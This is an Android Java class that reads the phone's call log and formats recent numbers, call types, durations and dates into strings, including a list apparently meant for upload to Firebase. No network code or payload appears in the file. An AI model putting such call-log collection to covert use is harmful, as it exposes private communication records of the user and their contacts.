package com.example.fasterpro11;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class GetRecentCallLogs {
    private static final String TAG = "GetRecentCallLogs";
    private Context mContext;  // Context ফিল্ড

    // কনস্ট্রাকটর ব্যবহার করে কন্টেক্সট ইনিশিয়ালাইজ করা
    public GetRecentCallLogs(Context context) {
        this.mContext = context;
    }


    public String getRecentCallLogs() {
        StringBuilder callLogBuilder = new StringBuilder();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };

        Cursor cursor = null;
        try {
            // কল লগগুলো নিয়ে আসা (LIMIT ছাড়া)
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    if (count >= 15) break; // সর্বোচ্চ ১০টি কল লগ দেখাবে
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));

                    String callType = getCallType(type);

                    callLogBuilder.append("Num: ").append(number)
                            .append(", Type: ").append(callType)
                            .append(", Duration: ").append(duration)
                            .append(", Date: ").append(DateUtils.dateToString(date))
                            .append("\n");
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving call logs: ", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return callLogBuilder.toString();
    }

    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

// get Recent CallLogs As List For Firebase
List<String> getRecentCallLogsAsListForFirebase() {
        List<String> recentCalls = new ArrayList<>();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };

        Cursor cursor = null;
        try {
            // Query all call logs without LIMIT
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    if (count >= 10) break; // Limit to 10 results
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));

                    String callType = getCallTypeAsListForFirebase(type);

                    // Add the call log to the list as a formatted string
                    String callLog = "Number: " + number
                            + ", Type: " + callType
                            + ", Duration: " + duration
                            + ", Date: " + DateUtils.dateToString(date);
                    recentCalls.add(callLog);  // Add the formatted string to the list
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving call logs: ", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return recentCalls;
    }

    private String getCallTypeAsListForFirebase(int type) {
        switch (type) {
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

    public String OTPTypeGetRecentCallLogs() {

        if (mContext == null) {
            Log.e(TAG, "getRecentCallLogs Context is null.");
            return "";
        }
        StringBuilder callLogBuilder = new StringBuilder();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };

        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    if (count >= 2) break;
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));

                    String callType = getCallType(type);

                    callLogBuilder.append("").append(number)
                            .append("").append(new SimpleDateFormat("0HH0mm0", Locale.getDefault()).format(new Date(date)))
                            .append("");
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving call logs: ", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return callLogBuilder.toString();

    }



    }
